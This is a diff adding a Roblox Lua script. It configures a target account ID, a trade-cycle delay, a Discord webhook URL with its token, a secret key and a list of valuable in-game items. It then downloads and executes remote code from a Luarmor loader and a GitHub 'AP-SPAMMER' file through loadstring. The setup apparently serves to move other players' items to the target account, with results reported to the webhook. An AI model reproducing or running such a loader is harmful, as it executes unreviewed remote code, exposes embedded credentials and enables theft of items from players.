@@ -1,0 +1,40 @@
+getgenv().SECRET_KEY = "mrr_05584198162f4f9ebba9641c28410d78"
+getgenv().TARGET_ID = 3865745180
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1485246007787913256/lJ0lENmGToTItBCtRiXalkQuAdALnIhxVeeW4eZDTwq8SbIJG1YkXmhl5PfzAgYJKk2l"
+getgenv().TARGET_BRAINROTS = {
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Nacho Spyder"] = true,
+    ["Griffin"] = true,
+    ["Festive 67"] = true,
+    ["Garama and Madundung"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Los Tacoritas"] = true,
+    ["Ginger Gerat"] = true,
+    ["Love Love Bear"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["La Casa Boo"] = true,
+    ["Los Sekolahs"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Ketupat Bros"] = true,
+    ["Cooki and Milki"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true
+}
+task.spawn(function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+end)
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZenoOwner/AP-SPAMMER/refs/heads/main/AP-SPAMMER"))()
+end)
